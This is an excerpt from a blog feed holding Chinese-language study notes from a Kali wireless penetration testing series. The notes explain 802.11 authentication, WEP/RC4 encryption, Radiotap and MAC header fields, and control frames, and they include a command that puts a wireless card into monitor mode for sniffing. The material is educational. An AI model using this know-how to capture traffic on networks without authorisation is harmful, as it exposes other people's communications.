        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="连接到无线网络"><a href="#连接到无线网络" class="headerlink" title="连接到无线网络"></a>连接到无线网络</h2><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220416154945722-1932171389.png" alt="img"></p><blockquote><ul><li><p>Probe</p><ul><li>STA向<strong>所有信道</strong>发出probe帧，发现AP</li><li>AP回应Response</li></ul></li><li><p>Authentication</p><ul><li>STA向AP发出验证请求</li><li>发生认证过程(步骤可变，如加密算法的不同)</li><li>AP响应STA的认证结果</li></ul></li><li><p>Association</p><ul><li>STA发出关联请求</li><li>AP响应关联请求</li><li>关联成功，开始通信</li></ul></li></ul></blockquote><h2 id="WEP和WPA探测过程"><a href="#WEP和WPA探测过程" class="headerlink" title="WEP和WPA探测过程"></a>WEP和WPA探测过程</h2><h4 id="Beacon标识使用WEP-x2F-WPA加密"><a href="#Beacon标识使用WEP-x2F-WPA加密" class="headerlink" title="Beacon标识使用WEP&#x2F;WPA加密"></a>Beacon标识使用WEP&#x2F;WPA加密</h4><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220416164012224-943793075.png" alt="img"></p><p>图片来源：</p><p><a href="https://www.cnblogs.com/z9m8r8/articles/16153103.html">https://www.cnblogs.com/z9m8r8/articles/16153103.html</a></p><h4 id="STA发送普通Probe帧"><a href="#STA发送普通Probe帧" class="headerlink" title="STA发送普通Probe帧"></a>STA发送普通Probe帧</h4><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/image-20230109111931866.png" alt="image-20230109111931866"></p><h4 id="AP响应Probe-Response帧声明其采用WEP-x2F-WPA加密"><a href="#AP响应Probe-Response帧声明其采用WEP-x2F-WPA加密" class="headerlink" title="AP响应Probe Response帧声明其采用WEP&#x2F;WPA加密"></a>AP响应Probe Response帧声明其采用WEP&#x2F;WPA加密</h4><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220416164747057-172690945.png" alt="img"></p><p>图片来源：</p><p><a href="https://www.cnblogs.com/z9m8r8/articles/16153103.html">https://www.cnblogs.com/z9m8r8/articles/16153103.html</a></p><blockquote><p>如果是WPA加密，则包头包含WPA1字段信息，如上图，另外不同厂商对802.11标准的实现方式不同，部分字段可能是厂商自己设的。</p></blockquote><h2 id="WEP-OPEN认证过程"><a href="#WEP-OPEN认证过程" class="headerlink" title="WEP OPEN认证过程"></a>WEP OPEN认证过程</h2><blockquote><ul><li>WEP Open认证与open认证通信过程相同</li><li>正确认证后通信数据被WEP加密</li><li>如果认证时客户端输入错误密码<ul><li>认证依然可以通过</li><li>AP将丢弃该STA的数据包<ul><li>起始向量被错误地密钥解密后完整性被破坏</li><li>但数据传输将失败</li></ul></li></ul></li><li>认证响应正确，身份验证成功</li></ul></blockquote><h2 id="WEP-PSK认证过程"><a href="#WEP-PSK认证过程" class="headerlink" title="WEP PSK认证过程"></a>WEP PSK认证过程</h2><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220416175250117-658255991.png" alt="img"></p><blockquote><ul><li>STA发认证过程</li><li>AP返回随机Challenge消息</li><li>STA使用PSK加密Cha并发回给AP</li><li>AP使用PSK解密密文，获得Cha并与原始Cha比对，相同则验证成功，不同则验证失败</li></ul><p><strong>注意：</strong></p><p><strong>认证过程中传输的是challenge被共享密钥加密后的密文串，密钥并不会直接传输。</strong></p><p><strong>大部分的无线驱动先会尝试几次open认证，直到被AP多次拒绝后才会进行预共享密钥的认证。</strong></p></blockquote><blockquote><ul><li><p>无论使用什么加密架构，关联过程完全相同</p><ul><li>STA向AP发送关联请求</li><li>AP向STA发送关联成功或失败结果</li></ul></li><li><p>隐藏AP</p><ul><li>STA关联包中必须包含目标AP的ESSID</li><li>嗅探到此关联包，说明有隐藏AP存在</li></ul></li></ul></blockquote><p><code>没有抓到相关无线包，后续记得补充</code></p><h2 id="无线加密"><a href="#无线加密" class="headerlink" title="无线加密"></a>无线加密</h2><blockquote><ul><li><p>无线安全根源</p><ul><li>802.11基于无线电波发射信息</li><li>嗅探侦听是主要问题</li><li>加密机制是必须手段</li></ul></li><li><p>Wired Equivalent Privacy (WEP)</p><ul><li>802.11标准的一部分</li><li>发布后不久被发现存在安全漏洞</li></ul></li><li><p>Wi-Fi Protected Access (WPA) 取代WEP</p><ul><li>WPA2 (802.11i标准)</li></ul></li></ul></blockquote><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a>OPEN无加密网络</h4><blockquote><ul><li><p>无任何加密机制</p></li><li><p>所有数据都可以被嗅探</p></li><li><p>STA和AP只协商拼配参数即可连入网络</p></li></ul></blockquote><h4 id="WEP-加密系统"><a href="#WEP-加密系统" class="headerlink" title="WEP 加密系统"></a>WEP 加密系统</h4><blockquote><ul><li><p>使用Rivest Cipher 4 (RC4)算法加密流量内容，实现机密性</p></li><li><p>CRC32算法检查数据完整性</p></li><li><p>标准采用使用24位initialization vector (IV)</p></li><li><p>受美国加密技术出口限制法律的要求</p><ul><li>高于64bit key禁止出口</li><li>所以除24bit IV之外真实的key只有40bit的版本被允许出口</li><li>出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)</li></ul></li></ul></blockquote><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a>RC4算法</h4><blockquote><ul><li><p>RSA实验室研发的对称加密流算法</p><ul><li>实现简单</li><li>速度快</li></ul></li><li><p>加密:对明文流和密钥流进行XOR计算</p></li><li><p>解密:对密文流和密钥流进行XOR计算</p></li></ul></blockquote><h5 id="RC4算法key由两个过程生成"><a href="#RC4算法key由两个过程生成" class="headerlink" title="RC4算法key由两个过程生成"></a>RC4算法key由两个过程生成</h5><blockquote><ul><li>合并IV和SKA，利用Key Scheduling Algorithm (KSA)算法生成起始状态表</li><li>Pseudo- Random Generation Algorithm (PRGA)算法生成最终密钥流（使密钥流长度与加密数据流长度一致）</li></ul></blockquote><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220417113846776-768867710.png" alt="img"></p><h5 id="RC4算法加密流程"><a href="#RC4算法加密流程" class="headerlink" title="RC4算法加密流程"></a>RC4算法加密流程</h5><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220417113912847-398234971.png" alt="img"></p><blockquote><p>实现过程：</p><p>IV值，数据发起方进行初始化的向量，再加上WEP密钥（密码），两者相结合（图中的黑色竖线），之后再使用KSA算法生成初始状态表，再通过PRGA算法生成密钥流（Keystream）；然后进行CRC32的摘要计算，生成一个32位的ICV，明文消息值和32位校验值相结合（图中下方黑色竖线），形成数据流，之后进行异或运算，形成密文的消息，还会将起始向量的IV值打入包中，后面会跟着KeyID（Key值的ID号）。</p></blockquote><blockquote><p>IV初始向量（24位），ICV（32位）是明文通过CRC32算法计算生成的完整性校验值；另外，数据加密主要使用两种密钥，DefaultKey和MappingKey。数据加密密钥一般使用默认密钥中Key ID为0的Default Key密钥。也就是说，所有的用户使用相同的密钥。</p></blockquote><h5 id="RC4算法解密流程"><a href="#RC4算法解密流程" class="headerlink" title="RC4算法解密流程"></a>RC4算法解密流程</h5><p><img src="/2023/01/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1%E8%BF%87%E7%A8%8B/2379545-20220417113943932-1177299759.png" alt="img"></p><blockquote><p>解密：</p><p>IV值提取出来，接收端会使用相同的算法将完整的密钥流算出来，再通过KeyID把针对此数据包中的key的内容提取出来，再将IV值和key结合起来（图中黑色竖线），再进行KSA计算生成密钥流的初始状态表，再使用PRGA算法生成最终加密计算的密钥流，再使用此密钥流与密文进行异或运算，生成数据包中的数据明文部分，将所有数据包解密之后生成完整的数据部分，之后还会生成一个ICV值与发送来的数据包中的ICV值进行比对，若相同则包没有被篡改，否则就被丢弃。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 无线渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 无线渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-Radiotap头部及802.11包分析</title>
      <link href="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/"/>
      <url>/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="RADIOTAP头部"><a href="#RADIOTAP头部" class="headerlink" title="RADIOTAP头部"></a>RADIOTAP头部</h2><blockquote><ul><li>802.11帧发射和接收的事实标准（Radiotap并不遵循802.11的标准，但802.11依赖Radiotap完成通信过程）</li><li>Linux系统在驱动和API中内建支持Radiotap的解析</li><li>802.11帧发射之前，网卡驱动在802.11头前面添加Radiotap头，反之当网卡接收到无线帧时，驱动通知MAC层，此帧头包含Radiotap头</li><li>Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定</li><li>不破坏原始头结构，增加传递的信息</li></ul></blockquote><h2 id="RADIOTAP包头分析"><a href="#RADIOTAP包头分析" class="headerlink" title="RADIOTAP包头分析"></a>RADIOTAP包头分析</h2><h4 id="开启网卡监听"><a href="#开启网卡监听" class="headerlink" title="开启网卡监听"></a>开启网卡监听</h4><pre class="line-numbers language-none"><code class="language-none">iw dev wlan0 interface add wlan0mon type monitorifconfig wlan0mon up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230102204434444.png" alt="image-20230102204434444"></p><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><ul><li>分为Header和data</li><li>Version（8bit）<ul><li>值始终为0</li></ul></li><li>Pad (8bit)<ul><li>未使用，只作为字段强制对其的占位</li></ul></li><li>Header length<ul><li>长度可变</li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230102205557304.png" alt="image-20230102205557304"></p><ul><li>Present flags<ul><li>后面数据位的掩码，表示数据位会出现那些内容；每32位一组</li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230102205840782.png" alt="image-20230102205840782"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230102210102862.png" alt="image-20230102210102862"></p><ul><li>Flags<ul><li>该标记位标志了后面的数据是否进行了加密，差错校验，数据重传等</li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230102210454686.png" alt="image-20230102210454686"></p><h2 id="802-11头部字段"><a href="#802-11头部字段" class="headerlink" title="802.11头部字段"></a>802.11头部字段</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><blockquote><ul><li>DU (Data Unit)即数据单元，信息传输的最小数据集合</li><li>传递过程逐层封装(Encapsulation)</li><li>SDU (Service Data Unit) &#x2F; PDU (Protocol Data Unit)</li><li>MSDU <strong>→</strong> MIC → 分帧 → 添加IV → 加密 → 添加MAC头部 → MPDU</li><li>MPDU&#x2F;PSDU +物理头 &#x3D; PPDU → RF发射</li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401150335894-1172943925.png" alt="img"></p><h3 id="PDU和SDU补充"><a href="#PDU和SDU补充" class="headerlink" title="PDU和SDU补充"></a>PDU和SDU补充</h3><h4 id="SDU（service-Data-Unit）"><a href="#SDU（service-Data-Unit）" class="headerlink" title="SDU（service Data Unit）"></a>SDU（service Data Unit）</h4><p>　　SDU（service Data Unit）：服务数据单元，又叫业务数据单元，是指定层的用户服务的数据集，传送到接收方的时候同一协议层时数据没有发生变化，即业务部分，然后发给下层之后，下层将其封装在PDU中发送出去。服务数据单元是从高层协议来的信息单元传送到低层协议。第N层服务数据单元SDU，和上一层的协议数据单元（PDU）是一一对应的。根据协议数据单元的数据的不同，送到接收端的指定层。</p><h4 id="PDU（Protocol-Data-Unit）"><a href="#PDU（Protocol-Data-Unit）" class="headerlink" title="PDU（Protocol Data Unit）"></a>PDU（Protocol Data Unit）</h4><ul><li>在电信领域，协议数据单元（PDU，Protocol Data Unit）有以下几层意义：<ul><li>网络的对等实体传送的信息单元，包括了控制信息，地址信息，或者数据。</li><li>在协议系统里，在指定的协议层上传送的数据单元，包含了该层的协议控制信息和用户信息。</li><li>在OSI模型系统里，PDU和最底下四层相关</li></ul></li></ul><h4 id="PDU和SDU的区别"><a href="#PDU和SDU的区别" class="headerlink" title="PDU和SDU的区别"></a>PDU和SDU的区别</h4><h5 id="PDU的封装-x2F-解封装"><a href="#PDU的封装-x2F-解封装" class="headerlink" title="PDU的封装&#x2F;解封装"></a>PDU的封装&#x2F;解封装</h5><p>　　在发送方，将用户递交的SDU加上协议控制信息PCI，封装成PDU；在接收方，讲接收到的PDU解封装，去掉PCI，还原成SDU送交接收方用户。</p><h5 id="SDU分段-x2F-装配"><a href="#SDU分段-x2F-装配" class="headerlink" title="SDU分段&#x2F;装配"></a>SDU分段&#x2F;装配</h5><p>　　如果下层通道的带宽不能满足传递SDU的需要，就需要将一个SDU分成多段，分别封装成PDU发送出去（分段）；在接收方再将这些PDU解封装后重新装配成SDU。</p><h5 id="SDU拼接-x2F-分离"><a href="#SDU拼接-x2F-分离" class="headerlink" title="SDU拼接&#x2F;分离"></a>SDU拼接&#x2F;分离</h5><p>　　拼接是指在发送方（n）层协议实体把多个长度较短的（n）SDU封装成一个（n）PDU来发送，在接收放再将接收到的（n）PDU解封装，将多个（n）SDU分离出来。采用拼接功能的目的是提高通道的利用率。</p><h5 id="PDU分割-x2F-组合"><a href="#PDU分割-x2F-组合" class="headerlink" title="PDU分割&#x2F;组合"></a>PDU分割&#x2F;组合</h5><p>　　PDU分割是指在发送端（n）层协议实体把一个（n）PDU分割成多个（n-1）SDU，并行地从多个（n-1）通道发送出去；接收端再将收到的多个（n-1）SDU组合成一个（n）PDU。由于这是一个N层功能，所以组合操作在N层中进行，即N层先得到多个分割开的（n）PDU，然后把它们组合成一个（n）PDU。有时NSDU较长，而N协议所要求的NPDU较短。这时就要对NSDU进行分段处理，将一个SDU分成两个或多个PDU来传送。当PDU所要求的长度比SDU还大时，也可将几个SDU合并成为一个PDU。</p><p><strong>原文地址：</strong></p><p><a href="http://www.elecfans.com/d/1690388.html">http://www.elecfans.com/d/1690388.html</a></p><h2 id="802-11头部分析"><a href="#802-11头部分析" class="headerlink" title="802.11头部分析"></a>802.11头部分析</h2><h3 id="802-11MAC头结构"><a href="#802-11MAC头结构" class="headerlink" title="802.11MAC头结构"></a>802.11MAC头结构</h3><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401161915662-1172285506.png" alt="img"></p><p><strong>Sequence Control 和 IPID的意义相似</strong></p><h4 id="Frame-control"><a href="#Frame-control" class="headerlink" title="Frame control"></a>Frame control</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401162224872-672643459.png" alt="img"></p><h5 id="Protocol-Version-2bit"><a href="#Protocol-Version-2bit" class="headerlink" title="Protocol Version (2bit)"></a>Protocol Version (2bit)</h5><blockquote><p>802.11协议版本，始终为0、1、2、3</p></blockquote><h5 id="Type-2bit"><a href="#Type-2bit" class="headerlink" title="Type (2bit)"></a>Type (2bit)</h5><blockquote><p>规定帧的具体用途(3种帧类型)</p><ul><li>控制帧(1)<ul><li>发送控制指令</li></ul></li><li>数据帧(2)</li><li>管理帧(0)</li></ul><p><strong>数值不同帧类型也不同</strong></p></blockquote><h5 id="SubType-4bit"><a href="#SubType-4bit" class="headerlink" title="SubType (4bit)"></a>SubType (4bit)</h5><blockquote><p>每个类型对应多个子类型，协议规定不同类型&#x2F;子类型的帧完成不同功能的操作</p><p>Association……：管理帧，station向AP发起，Probe……：探测帧，Reserved：保留位，尚未使用</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401162327407-1818077424.png" alt="img"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401162358628-1139460985.png" alt="img"></p><h5 id="ToDS-x2F-FromDS-1-x2F-1bit"><a href="#ToDS-x2F-FromDS-1-x2F-1bit" class="headerlink" title="ToDS&#x2F;FromDS(1&#x2F;1bit)"></a>ToDS&#x2F;FromDS(1&#x2F;1bit)</h5><p>标识帧的传输方向，传向DS或者来自DS；这两个字段的值决定着MAC头中4个Address字段的不同定义，具体如下图所示（BSSID即AP地址）</p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220401164842469-260124030.png" alt="img"></p><blockquote><p><strong>0x00：</strong>出现在IBSS环境中(可能是Management帧或者是Control帧类型) ，或者是STSL (Station to Station Link)中两个STA间通信， 这种情况下通信不通过AP；</p><p><strong>0x01：</strong>表示Data帧从AP向STA传递；</p><p><strong>0x02：</strong>表示Data帧从STA向AP传递；</p><p><strong>0x03：</strong>表示两个AP间通信，这是典型的WDS (Wireless Distribution System)环境下AP间的通信，或者表示Mesh环境下MP间的通信，只有此时才会使用到Address4字段（RA,TA两个AP的地址）。</p></blockquote><h5 id="More-frag-1bit"><a href="#More-frag-1bit" class="headerlink" title="More frag (1bit)"></a>More frag (1bit)</h5><blockquote><p>表示是否还有后续帧，值为1时表示有后续分段，可能是Data或Management帧类型。只有单播接收地址的帧会被分段；</p></blockquote><h5 id="Retry-1bit"><a href="#Retry-1bit" class="headerlink" title="Retry (1bit)"></a>Retry (1bit)</h5><blockquote><p>重传，值为1表示重传帧（初次发送是被置为0的，当发完后没收到ACK则会置1进行重发），可能是Data或Management帧类型，接收端进程使用此值防止帧重复（该值为1且自己已经接收过该帧，则会直接丢弃）；</p></blockquote><h5 id="Power-Mgmt-1bit"><a href="#Power-Mgmt-1bit" class="headerlink" title="Power Mgmt (1bit)"></a>Power Mgmt (1bit)</h5><blockquote><p>活动模式(0) &#x2F;省电模式(1)，STA处于省电模式时，向关联的AP发送该值为1的帧(AP从不使用此字段，恒为0)，省电模式下STA不接收数据（但会接收AP发的一些特殊帧，如有唤醒意义的帧（省电 <strong>→</strong> 活动模式）），发送给它的Data帧由AP暂时缓存，待AP将它唤醒后，它会主动取回相应缓存；</p></blockquote><h5 id="More-Data-1bit"><a href="#More-Data-1bit" class="headerlink" title="More Data (1bit)"></a>More Data (1bit)</h5><blockquote><p>当AP缓存了至少一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己并向AP发送PS- Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播 <strong>&#x2F;</strong> 多播帧需要发送的情况；</p></blockquote><h5 id="Protected-Frame-1bit"><a href="#Protected-Frame-1bit" class="headerlink" title="Protected Frame (1bit)"></a>Protected Frame (1bit)</h5><blockquote><p>可能是Data或Management帧类型，表示MSDU是否被加密，也被用于表示PSK身份验证Frame#3帧，数据载荷为空时，该字段值为0；</p></blockquote><h5 id="Order-1bit"><a href="#Order-1bit" class="headerlink" title="Order (1bit)"></a>Order (1bit)</h5><blockquote><p>在非QoS（质量控制）帧的情况下，值为1表示数据必须按严格顺序处理（如按顺序发送），通常为0；</p></blockquote><h4 id="Duration-x2F-ID-16bit"><a href="#Duration-x2F-ID-16bit" class="headerlink" title="Duration&#x2F;ID (16bit)"></a>Duration&#x2F;ID (16bit)</h4><blockquote><p>所有Control帧都使用该字段，其作用随Type&#x2F;SubType变化有所不同；</p><p>帧类型为PS Poll (type:1, subtype:10)时，表示STA关联的AID (association identity) ，即当station在省电模式收到AP的唤醒帧后，会向AP发送该字段填充为AID的PS-Poll帧，在AP收到PS-Poll帧后，根据AID发送为其缓存的数据；</p><p>其他情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于NAV (Network Allocation Vector)计算，单位是微秒;</p></blockquote><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a>MAC Layer Address</h4><blockquote><p>参见ToDS&#x2F;FromDS(1&#x2F;1bit)字段的介绍</p><p>补充：Basic service set ID (BSSID)，它是BSS的2层唯一标识，Infrastructure模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID。</p></blockquote><h4 id="Sequence-Control-16bit"><a href="#Sequence-Control-16bit" class="headerlink" title="Sequence Control (16bit)"></a>Sequence Control (16bit)</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403163951396-1400741748.png" alt="img"></p><blockquote><p>这个字段包含两个子字段: Sequence Number和Fragment Number;</p><p>Sequence Number是每个帧的编号，数值范围是0- 4095，以1为步长递增。当帧被分段时，同一帧中不同分段的Sequence Number相同;</p><p>Fragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围是0-15, 以1为步长递增（即帧加上头部信息后过大，则该帧又会被分成多端传送，段的编号即为Fragment Number）;</p></blockquote><h4 id="Frame-Body-变长"><a href="#Frame-Body-变长" class="headerlink" title="Frame Body (变长)"></a>Frame Body (变长)</h4><blockquote><p>数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的上层头信息，和可被传递的数据2048字节）。不同的加密方法会增加一定的内容长度;</p><p>WEP：8 bytes → 2312 bytes</p><p>TKIP (WPA1)：20 bytes → 2324 bytes</p><p>CCMP (WPA2)：16 bytes → 2320 bytes</p><p><strong>注：</strong>Control类型的帧没有Frame Body内容</p></blockquote><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS (32bit)"></a>FCS (32bit)</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403164012957-2042046478.png" alt="img"></p><blockquote><p>发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS (Frame Check Sequence)值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广 播&#x2F;多播帧可能被接收）。</p><p><strong>注：</strong>wireshark抓包时已经删除了FCS值。</p></blockquote><h2 id="CONTROL-FRAME"><a href="#CONTROL-FRAME" class="headerlink" title="CONTROL FRAME"></a>CONTROL FRAME</h2><blockquote><p>控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息，无数据段，只有包头。</p></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403165304205-1257576407.png" alt="img"></p><h2 id="ACK"><a href="#ACK" class="headerlink" title="ACK"></a>ACK</h2><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403170627748-188178935.png" alt="img"></p><blockquote><ul><li><p>接收端正确接收数据之后向发送端返回ACK确认</p></li><li><p>每个单播帧需要ACK立刻确认</p><ul><li>组播和广播帧不需要ACK确认</li></ul></li><li><p>尽快响应</p><ul><li>由硬件完成，而非驱动层</li></ul></li><li><p>Type&#x2F;SubType：1&#x2F;13（帧类型是1；子类型是13）</p></li></ul></blockquote><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/image-20230103103507613.png" alt="image-20230103103507613"></p><h2 id="PS-POLL"><a href="#PS-POLL" class="headerlink" title="PS-POLL"></a>PS-POLL</h2><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403180525862-1380471659.png" alt="img"></p><blockquote><ul><li><p>RF系统的放大器</p><ul><li>主要耗电的组件</li><li>发射前放大信号，接收并放大还原信号</li></ul></li><li><p>省电模式</p><ul><li>关闭信号发射器节省电源耗电(几乎完全关闭)</li></ul></li></ul></blockquote><ul><li><p>AID-Association ID</p></li><li><p><strong>STA省电模式唤醒</strong></p><ul><li>数据发送至AP (AP缓存数据包)</li><li>通过Beacon发送TIM (traffic indication map)<ul><li>其中包含AID</li></ul></li><li>STA对比AID后唤醒网卡</li><li>STA发送PS-PolI帧，请求从AP缓存中取回数据<ul><li>每个帧都需要ACK确认</li><li>ACK去人后AP从缓存中删除数据帧</li><li>传输过程中STA保持唤醒状态</li><li>传输结束后STA恢复省电状态</li></ul></li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403180448778-647780011.png" alt="img"></p><ul><li><strong>AP接收PS- PolI帧</strong><ul><li>立刻响应</li><li>延迟响应<ul><li>简单响应帧</li></ul></li></ul></li><li>AID：关联ID</li><li>BSSID：STA正关联的AP地址</li><li>TA：发送此帧的STA地址</li></ul><h2 id="RTS-x2F-CTS"><a href="#RTS-x2F-CTS" class="headerlink" title="RTS&#x2F;CTS"></a>RTS&#x2F;CTS</h2><ul><li><p>RTS&#x2F;CTS是CSMA&#x2F;CA方法的一种补充手段</p><ul><li><p>RTS（请求传输服务）和CTS（空闲传输服务）</p></li><li><p>降低冲突产生的可能性</p></li><li><p>正式通信之前通过请求应答机制，确信通信介质的可用性</p></li><li><p>并锁定传输介质和预约通信时间。</p></li><li><p>只有在传输长帧时使用，传输短帧时不会使用</p><ul><li>驱动接口提供阈值的自定义</li><li>大于阈值的帧被视为长帧，反之则视为短帧</li></ul></li></ul></li><li><p>传输机制</p><ul><li>Node 1发送Request to Send包给Node2</li><li>如果未发生冲突，Node2返回Clear to Send给Node 1</li><li>Node 1传输数据</li><li>数据正常接收，Node2返回ACK，否则Node 1什么也不会收到</li></ul></li></ul><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403184948377-1804974125.png" alt="img"></p><ul><li><p><strong>有线网络介质访问方式: CSMA&#x2F;CD</strong></p></li><li><p><strong>无线网络介质访问方法: CSMA&#x2F;CA</strong></p></li><li><p><strong>避免隐藏节点的冲突</strong></p><ul><li>n1,n2,n3三个节点，n1,n3彼此不知道对方的存在，相对而言为隐藏节点，当n1,n3同时要与n2通信时则会导致冲突（CSMA&#x2F;CA），而采用RTS&#x2F;CTS方式可避免冲突。</li></ul></li></ul><h4 id="RTS（帧长度20字节）"><a href="#RTS（帧长度20字节）" class="headerlink" title="RTS（帧长度20字节）"></a>RTS（帧长度20字节）</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403185007732-962071099.png" alt="img"></p><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403190850257-2126129990.png" alt="img"></p><h4 id="CTS（帧长度14字节）"><a href="#CTS（帧长度14字节）" class="headerlink" title="CTS（帧长度14字节）"></a>CTS（帧长度14字节）</h4><p><img src="/2023/01/02/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Radiotap%E5%A4%B4%E9%83%A8/2379545-20220403185021849-1448447689.png" alt="img"></p><p><img 